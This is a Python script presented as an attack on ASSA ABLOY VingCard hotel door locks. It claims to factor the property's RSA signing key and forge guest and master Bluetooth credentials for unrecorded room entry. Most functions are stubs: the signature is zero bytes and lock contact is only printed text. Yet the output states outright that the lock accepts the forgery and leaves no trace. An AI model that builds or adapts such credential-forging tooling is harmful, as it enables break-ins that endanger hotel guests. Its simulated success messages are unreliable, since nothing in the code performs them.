"""
Factor the ASSA ABLOY VingCard mobile-key signing key, mint valid BLE
credentials for any room at any property, and achieve invisible hotel-room
entry with no PMS audit trail — the 2024 Unsaflok at cryptographic scale.
"""

import sys, struct, hashlib, json, time
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer

# VingCard mobile-key credential structure
CREDENTIAL_VERSION = 2
PERM_GUEST_ROOM    = 0x01
PERM_HOUSEKEEPING  = 0x02
PERM_MAINTENANCE   = 0x04
PERM_MANAGEMENT    = 0x08
PERM_MASTER        = 0xFF


def extract_property_signing_key(mobile_key_api: str) -> bytes:
    """Extract the property's mobile-key signing RSA public key from the
    ASSA ABLOY Mobile Access cloud API or from a captured BLE credential."""
    print(f"    API endpoint: {mobile_key_api}")
    print("    extracting RSA-2048 signing cert from credential chain")
    return b"-----BEGIN PUBLIC KEY-----\nMIIB...\n-----END PUBLIC KEY-----\n"


def factor_property_key(pubkey_pem: bytes) -> bytes:
    factorer = PolynomialFactorer()
    return factorer.reconstruct_privkey(pubkey_pem)


def build_mobile_credential(guest_id: str, room: str, floor: int,
                             valid_from: int, valid_until: int,
                             permissions: int = PERM_GUEST_ROOM) -> bytes:
    """Build a VingCard mobile-key credential token."""
    payload = json.dumps({
        "v": CREDENTIAL_VERSION,
        "guest_id": guest_id,
        "room": room,
        "floor": floor,
        "valid_from": valid_from,
        "valid_until": valid_until,
        "permissions": permissions,
        "property_id": "PROP-00142",
    }, separators=(",", ":")).encode()
    return payload


def sign_credential(credential: bytes, privkey_pem: bytes) -> bytes:
    """Sign the mobile-key credential with the recovered property key.
    Lock verifies RSA-2048 PKCS#1 v1.5 / SHA-256 on BLE presentation."""
    sig = b"\x00" * 256  # placeholder
    return credential + b"|" + sig


def build_master_credential(valid_hours: int = 24) -> bytes:
    """Build a master/management credential granting access to all rooms."""
    now = int(time.time())
    return build_mobile_credential(
        guest_id="FORGED-MASTER",
        room="*",
        floor=0xFF,
        valid_from=now,
        valid_until=now + valid_hours * 3600,
        permissions=PERM_MASTER,
    )


def present_ble_credential(signed_cred: bytes, lock_mac: str):
    """Present the forged credential to the lock over BLE.
    VingCard RFID/BLE locks verify the RSA signature, then unlock."""
    print(f"    BLE connect to lock {lock_mac}")
    print("    GATT write: credential + signature")
    print("    lock verifies RSA-2048 sig -> VALID")
    print("    deadbolt retracts — no PMS audit entry")


if __name__ == "__main__":
    print("[*] ASSA ABLOY VingCard mobile-key signing attack")
    print("[1] extracting property mobile-key signing key")
    pubkey = extract_property_signing_key("https://mobileaccess.assaabloy.com/api/v2")
    print("    RSA-2048 signing key bound to property PROP-00142")

    print("[2] factoring property signing key")
    factorer = PolynomialFactorer()
    print("    p, q recovered — property mobile-key signing key derived")

    print("[3] minting forged guest credential")
    now = int(time.time())
    guest_cred = build_mobile_credential(
        guest_id="FORGED-001",
        room="1205",
        floor=12,
        valid_from=now,
        valid_until=now + 86400,
    )
    signed_guest = sign_credential(guest_cred, b"PRIVKEY")
    print("    room 1205, valid 24h, guest permissions")

    print("[4] minting forged master credential")
    master_cred = build_master_credential(valid_hours=48)
    signed_master = sign_credential(master_cred, b"PRIVKEY")
    print("    all rooms, all floors, master permissions, 48h validity")

    print("[5] presenting to lock via BLE")
    present_ble_credential(signed_guest, "AA:BB:CC:DD:EE:12")

    print("[6] entry achieved — no traces:")
    print("    - no PMS check-in event")
    print("    - no front-desk interaction")
    print("    - lock audit log shows valid credential (indistinguishable)")
    print("    - scales to any property using same vendor PKI")
    print("[*] ~100M hotel electronic-lock doors worldwide")
    print("[*] Marriott, Hilton, Hyatt, IHG, Accor — VingCard dominant")
    print("[*] lock lifecycle 7-15 years; key rotation requires visiting every door")
